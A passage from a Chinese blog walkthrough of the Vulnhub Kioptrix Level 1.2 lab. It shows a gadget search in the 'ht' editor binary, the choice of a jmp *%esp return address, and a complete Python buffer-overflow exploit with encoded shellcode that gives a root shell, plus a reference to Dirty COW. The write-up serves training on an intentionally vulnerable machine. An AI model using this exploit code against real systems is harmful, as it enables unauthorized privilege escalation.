jmpbuster.c</span><br><span class="line">-rw-r--r-- 1 loneferret <span class="built_in">users</span>       106 2024-10-03 15:41 Makefile</span><br><span class="line">-rw-r--r-- 1 loneferret <span class="built_in">users</span>       285 2024-10-03 15:41 README.md</span><br><span class="line">-rw-r--r-- 1 loneferret <span class="built_in">users</span>        95 2024-10-03 15:41 TODO</span><br><span class="line">loneferret@Kioptrix3:~/jmpbuster$</span><br><span class="line">loneferret@Kioptrix3:~/jmpbuster$ make x86</span><br><span class="line">gcc jmpbuster.c -o jmpbuster</span><br><span class="line">loneferret@Kioptrix3:~/jmpbuster$ <span class="built_in">ls</span> -al</span><br><span class="line">total 44</span><br><span class="line">drwxr-xr-x 2 loneferret <span class="built_in">users</span>      4096 2024-10-03 15:41 .</span><br><span class="line">drwxr-xr-x 4 loneferret loneferret 4096 2024-10-03 15:40 ..</span><br><span class="line">-rw-r--r-- 1 loneferret <span class="built_in">users</span>      7059 2024-10-03 15:41 jmpbustarm.c</span><br><span class="line">-rwxr-xr-x 1 loneferret <span class="built_in">users</span>      9793 2024-10-03 15:41 jmpbuster</span><br><span class="line">-rw-r--r-- 1 loneferret <span class="built_in">users</span>      3357 2024-10-03 15:41 jmpbuster.c</span><br><span class="line">-rw-r--r-- 1 loneferret <span class="built_in">users</span>       106 2024-10-03 15:41 Makefile</span><br><span class="line">-rw-r--r-- 1 loneferret <span class="built_in">users</span>       285 2024-10-03 15:41 README.md</span><br><span class="line">-rw-r--r-- 1 loneferret <span class="built_in">users</span>        95 2024-10-03 15:41 TODO</span><br><span class="line">loneferret@Kioptrix3:~/jmpbuster$</span><br><span class="line">loneferret@Kioptrix3:~/jmpbuster$ ./jmpbuster /usr/local/bin/ht | more</span><br><span class="line">** JMP buster - Tool <span class="keyword">for</span> searching registers JMP/CALL inside an executable file</span><br><span class="line">by BlackLight, released under GNU GPL license v.3, 2009</span><br><span class="line"></span><br><span class="line">-&gt; [call *%edx] found at addr 0x0804ac89</span><br><span class="line">-&gt; [call *%eax] found at addr 0x0804acbf</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0804bcb9</span><br><span class="line">-&gt; [call *%ebx] found at addr 0x0804bd4c</span><br><span class="line">-&gt; [call *%ebx] found at addr 0x0804bdea</span><br><span class="line">-&gt; [call *%ebx] found at addr 0x0804be9e</span><br><span class="line">-&gt; [call *%ebx] found at addr 0x0804bf2a</span><br><span class="line">-&gt; [call *%ebx] found at addr 0x0804bfe6</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0804c287</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0804c33b</span><br><span class="line">-&gt; [call *%ebx] found at addr 0x0804c38b</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0804c3a9</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0804c4db</span><br><span class="line">-&gt; [call *%ebx] found at addr 0x0804c644</span><br><span class="line">-&gt; [call *%ebx] found at addr 0x0804c6f2</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0804c7fb</span><br><span class="line">……………………………………</span><br><span class="line"></span><br><span class="line">-&gt; [jmp *%esp] found at addr 0x0811bec5</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0811bf5c</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0811d180</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0811d43c</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0811e490</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0811e61c</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0811ecf0</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0811ef2c</span><br><span class="line">-&gt; [call *%ecx] found at addr 0x0811f323</span><br><span class="line">-&gt; [call *%ecx] found at addr 0x0811f3ed</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0811fbb0</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0811fe1c</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x08120790</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x0812092c</span><br><span class="line">-&gt; [call *%edx] found at addr 0x08122c19</span><br><span class="line">-&gt; [call *%edx] found at addr 0x08122cc2</span><br><span class="line">-&gt; [call *%edx] found at addr 0x08125599</span><br><span class="line">-&gt; [jmp *%ecx] found at addr 0x08128b62</span><br><span class="line">-&gt; [call *%edx] found at addr 0x0812b096</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>EIP 覆盖地址 <code>0x0811bec5</code> <span
class="math inline">\(\Rightarrow\)</span>
<code>\xc5\xbe\x11\x08</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt; [jmp *%esp] found at addr 0x0811bec5</span><br></pre></td></tr></table></figure>
<p>BufferOverflow_v2.py</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ <span class="built_in">cat</span> exploit.py.bak</span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line">buff=<span class="string">&quot;\x90&quot;</span>*4091</span><br><span class="line"></span><br><span class="line">eip=<span class="string">&quot;\xc5\xbe\x11\x08&quot;</span></span><br><span class="line"></span><br><span class="line">nops=<span class="string">&quot;\x90&quot;</span>*50</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x89\xe0\xdb\xd3\xd9\x70\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x33\x5a\x46\x6b\x73\x68\x6d\x49\x53\x62\x53\x56\x52\x48\x34\x6d\x45\x33\x4f\x79\x69\x77\x71\x78\x44\x6f\x72\x53\x42\x48\x63\x30\x55\x38\x54\x6f\x73\x52\x72\x49\x42\x4e\x4d\x59\x48\x63\x62\x72\x4d\x38\x66\x6a\x57\x70\x33\x30\x63\x30\x46\x4f\x50\x62\x33\x59\x42\x4e\x46\x4f\x32\x42\x43\x51\x64\x33\x73\x58\x73\x30\x63\x67\x72\x73\x6f\x79\x6d\x31\x4a\x6d\x4f\x70\x41\x41&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> buff+eip+nops+shellcode</span><br></pre></td></tr></table></figure>
<p>提权</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410040004197.jpg" /></p>
<p>获得 root 权限</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410040005462.jpg" /></p>
<h3 id="cve-2016-5195">3.6. CVE-2016-5195</h3>
<blockquote>
<p><strong>参见</strong>：<br />
- <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/450">脏牛（Dirty
COW）漏洞分析报告——【CVE-2016-5195】</a><br />
- <a
target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7561">CVE-2016-5195漏洞分析与复现</a></p>
</blockquote>
<h2 id="参考">4. 参考</h2>
<ul>
<li><a target="_blank" rel="noopener" href="https://vimeo.com/28327470">Kioptrix level 3
solution</a><br />
</li>
<li><a
target="_blank" rel="noopener" href="https://volta-sec.blogspot.com/2017/02/kioptrix-level-3-dont-forget-low.html">My
Journey in Cyber Security: Kioptrix Level 3 (Don't forget the low
hanging fruit)</a></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>Phantom
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://z9m8r8.github.io/2024/10/03/Kioptrix%20Level%201.2/" title="Kioptrix: Level 1.2">https://z9m8r8.github.io/2024/10/03/Kioptrix Level 1.2/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/Vulnhub/" rel="tag"><i class="fa fa-tag"></i> Vulnhub</a>
              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
              <a href="/tags/Buffer-Overflow/" rel="tag"><i class="fa fa-tag"></i> Buffer Overflow</a>
              <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" rel="tag"><i class="fa fa-tag"></i> 缓冲区溢出</a>
              <a href="/tags/RCE/" rel="tag"><i class="fa fa-tag"></i> RCE</a>
              <a href="/tags/Dirty-COW/" rel="tag"><i class="fa fa-tag"></i> Dirty COW</a>
              <a href="/tags/SQL-Injection/" rel="tag"><i class="fa fa-tag"></i> SQL Injection</a>
              <a href="/tags/LotusCMS/" rel="tag"><i class="fa fa-tag"></i> LotusCMS</a>
              <a href="/tags/LFI/" rel="tag"><i class="fa fa-tag"></i> LFI</a>
              <a href="/tags/ASLR/" rel="tag"><i class="fa fa-tag"></i> ASLR</a>
              <a href="/tags/HT-%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> HT 提权</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/09/27/hacksudo%20Thor/" rel="prev" title="hacksudo: Thor">
                  <i class="fa fa-angle-left"></i> hacksudo: Thor
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/10/06/Kioptrix%20Level%201.3/" rel="next" title="Kioptrix: Level 1.3">
                  Kioptrix: Level 1.3 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2020 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Phantom</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">330k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">20:01</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/fancybox.js"></script>

  <script src="/js/third-party/pace.js"></script>


  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/10/03/Kioptrix%20Level%201.2/"}</script>
  <script src="/js/third-party/quicklink.js"></script>

</body>
</html>
